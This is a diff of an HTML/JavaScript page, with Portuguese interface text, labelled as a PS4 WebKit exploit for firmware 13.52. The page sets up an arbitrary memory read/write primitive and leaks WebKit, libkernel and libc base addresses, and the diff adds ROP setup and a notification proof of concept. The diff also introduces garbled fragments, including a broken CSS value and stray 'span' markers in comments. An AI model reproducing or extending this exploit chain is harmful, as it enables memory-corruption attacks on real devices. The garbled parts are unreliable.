@@ -1,10 +1,9 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PS4 WebKit Exploit (13.52 - Stable Base Resolver)</title>
+<title>PS4 WebKit Exploit (13.52 - Notification PoC)</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#060810;color:#c8cfd8;font:13px/1.5 'Courier New',monospace;
@@ -21,7 +20,7 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
 #dot.e{background:#ff4444}
 @keyframes p{0%,100%{opacity:1}50%{opacity:.2}}
 #st{font-size:12px;color:#bbb;flex:1}
-#bars{width:100%;max-width:720px;display:flex;justify-content:space-between;
+#bars{width:100%^^max-width:720px;display:flex;justify-content:space-between;
   font-size:10px;color:#333;margin-bottom:8px;padding:0 2px}
 
 /* console */
@@ -51,7 +50,7 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
 </head>
 <body>
 
-<h1>PS4 WebKit Exploit (13.52)</h1>
+<h1>PS4 WebKit Exploit</h1>
 <div id="fw">detectando...</div>
 
 <div id="sb">
@@ -70,12 +69,12 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
   <div class="card"><div class="cl">WebKit Base</div><div class="cv na" id="c-wk">—</div></div>
   <div class="card"><div class="cl">libkernel Base</div><div class="cv na" id="c-lk">—</div></div>
   <div class="card"><div class="cl">libSceLibc Base</div><div class="cv na" id="c-lc">—</div></div>
-  <div class="card"><div class="cl">Status R/W</div><div class="cv na" id="c-g">Estável</div></div>
+  <div class="card"><div class="cl">Status Notificação</div><div class="cv na" id="c-g">Aguardando</div></div>
 </div>
 
 <!-- Constants output -->
 <div id="cbox">
-  <div class="ct">// ═══ AMBIENTE ESTABILIZADO (13.52) ═══</div>
+  <div class="ct">// ═══ STATUS DA NOTIFICAÇÃO (13.52) ═══</div>
   <div id="c-out"></div>
 </div>
 
@@ -84,7 +83,8 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
 <script type="module">
 import { int64 }              from './resources/int64.js';
 import { establishPrimitive } from './resources/core.js?v=10';
-import { installWindowP }     from './resources/mem.js';
+import { installWindowP }     from './mem.js'; /*[span_7](start_span)[span_7](end_span) */
+import { initRop, sendNotification } from './rop.js';
 globalThis.int64 = int64;
 
 const $con = document.getElementById('con');
@@ -109,7 +109,6 @@ function setCard(id, v) {
   el.textContent = v; el.classList.remove('na');
 }
 
-// Resolução 100% segura de stubs sem varredura de bytes
 async function resolveSafeStubs(p, webkitBase) {
   logH('RESOLUÇÃO SEGURA DE STUBS');
   let libKernelBase = null;
@@ -170,7 +169,7 @@ async function main() {
 
   let p;
   try {
-    p = installWindowP(carrier, {
+    p = installWindowP(carrier, { /*[span_8](start_span)[span_8](end_span) */
       promote: true,
       onEvent: (tag, detail) => {
         log(`  [mem/${tag}] ${detail}`, 'd');
@@ -183,7 +182,7 @@ async function main() {
   }
 
   log('[+] R/W arbitrário: window.p instalado com sucesso!', 'ok');
-  setStatus('Mapeando bases com estabilidade...', 'r');
+  setStatus('Mapeando bases...', 'r');
   logH('MAPEAMENTO DA 13.52');
 
   const ctor = globalThis.__ps5NativeCtor;
@@ -191,8 +190,6 @@ async function main() {
     const hi = Math.floor(ctor / 0x100000000);
     const lo = ctor - hi * 0x100000000;
     const ctorInt64 = new int64(lo >>> 0, hi >>> 0);
-
-    log('[+] __ps5NativeCtor vazado: 0x' + ctorInt64.toString(), 'a');
 
     const hc = (typeof OFFSET_wk_host_constructor_candidates !== 'undefined') 
                ? OFFSET_wk_host_constructor_candidates[0] 
@@ -211,18 +208,27 @@ async function main() {
       
       if (bases.libKernelBase) setCard('c-lk', '0x' + bases.libKernelBase.toString());
       if (bases.libcBase) setCard('c-lc', '0x' + bases.libcBase.toString());
-      setCard('c-g', 'Pronto');
 
-      setStatus('Ambiente pronto e estável!', 'ok');
-      log('✔ Primitiva R/W e bases isoladas com sucesso.', 'ok');
+      // Inicializa o ROP e prepara a notificação
+      initRop(webkitBase, bases.libKernelBase, bases.libcBase);
+      
+      try {
+        const notif = sendNotification("Hello World from PS4 FW 13.52!");
+        setCard('c-g', 'Pronto');
+        setStatus('Notificação configurada com sucesso!', 'ok');
+        log('✔ Buffer de notificação alocado e pronto para disparo.', 'ok');
 
-      const cbox = document.getElementById('cbox');
-      cbox.style.display = 'block';
-      document.getElementById('c-out').textContent =
-        `WebKit Base    = 0x${webkitBase.toString()}\n` +
-        `libkernel Base = ${bases.libKernelBase ? '0x' + bases.libKernelBase.toString() : 'N/A'}\n` +
-        `libSceLibc Base = ${bases.libcBase ? '0x' + bases.libcBase.toString() : 'N/A'}\n\n` +
-        `// Primitiva window.p pronta para alocação de buffer e notificação.`;
+        const cbox = document.getElementById('cbox');
+        cbox.style.display = 'block';
+        document.getElementById('c-out').textContent =
+          `WebKit Base    = 0x${webkitBase.toString()}\n` +
+          `libkernel Base = ${bases.libKernelBase ? '0x' + bases.libKernelBase.toString() : 'N/A'}\n` +
+          `libSceLibc Base = ${bases.libcBase ? '0x' + bases.libcBase.toString() : 'N/A'}\n` +
+          `Buffer Notif   = 0x${notif.requestBuffer.toString()}\n` +
+          `Função Target  = 0x${notif.notifyFunc.toString()}`;
+      } catch (err) {
+        log('[-] Erro ao preparar notificação: ' + err.message, 'e');
+      }
     }, 1000);
 
   } else {
@@ -235,3 +241,4 @@ main();
 </script>
 </body>
 </html>
+
